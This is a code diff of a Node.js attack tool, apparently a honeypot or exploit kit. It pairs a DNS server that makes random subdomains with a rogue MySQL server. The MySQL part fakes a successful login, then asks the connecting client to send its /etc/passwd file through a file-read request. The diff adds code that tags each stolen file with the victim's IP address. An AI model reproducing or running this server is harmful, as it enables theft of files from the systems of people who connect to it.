@@ -37,8 +37,8 @@ function getRandomDomain(len){
 	return Math.random().toString(36).substr(13-len)+'.'+config.domain;
 }
 
-server.listen(53, '0.0.0.0', function() {
-	console.log('DNS server started on port 53');
+server.listen(config.dns_port, '0.0.0.0', function() {
+	console.log('DNS server started on port '+config.dns_port);
 });
 
 server.on('query', function(query) {
@@ -73,15 +73,17 @@ server.on('query', function(query) {
 /* 创建mysql服务器 */
 var server = net.createServer(function(socket){
     /* 获取地址信息 */
-    var address = server.address();
+    //var address = server.address();
     var filename = "/etc/passwd";
     var handshake = "\x45\x00\x00\x00\x0a\x35\x2e\x31\x2e\x36\x33\x2d\x30\x75\x62\x75\x6e\x74\x75\x30\x2e\x31\x30\x2e\x30\x34\x2e\x31\x00\x26\x00\x00\x00\x7a\x42\x7a\x60\x51\x56\x3b\x64\x00\xff\xf7\x08\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x64\x4c\x2f\x44\x47\x77\x43\x2a\x43\x56\x63\x72\x00";
     var authsuccess = "\x07\x00\x00\x02\x00\x00\x00\x02\x00\x00\x00";
     var someshit = "\x07\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00";
     /* 发送数据 */
+    //console.log(socket.remoteAddress);
     socket.write(handshake,'binary',function(){
         socket.once('data',function(data){
             //console.log(data.toString());
+            //console.log(socket);
             socket.write(authsuccess,'binary');
             //socket.write(someshit,'binary');
             var userinfo = data.toString();
@@ -95,7 +97,7 @@ var server = net.createServer(function(socket){
             socket.once('data',function(data){
                 socket.write(wantfile,'binary');
                 socket.on('data',function(data){
-                    var data = data.toString();
+                    var data = "From IP: "+ socket.remoteAddress.split(":").slice(-1)[0] +"\n"+data.toString();
                     //console.log(data);
                     if(data.indexOf("select")>-1){
                         socket.write(wantfile,'binary');
